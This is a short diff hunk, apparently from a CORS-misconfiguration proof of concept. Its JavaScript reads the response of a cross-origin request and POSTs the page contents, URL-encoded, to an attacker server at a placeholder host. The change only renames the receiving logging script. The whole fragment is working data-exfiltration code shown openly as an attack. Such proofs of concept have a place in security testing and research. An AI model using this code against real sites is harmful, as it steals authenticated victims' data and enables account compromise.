@@ -21,7 +21,7 @@
 			function reqListener() {
 				var exfiltraterequest = new XMLHttpRequest();
 				//Our server hosting the CORS attack
-				var maliciousurl = 'http://[our-server]:8000/cgi-bin/log.py';
+				var maliciousurl = 'http://[our-server]:8000/cgi-bin/postlogger.py';
 				exfiltraterequest.open('POST', maliciousurl);
 				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 				exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
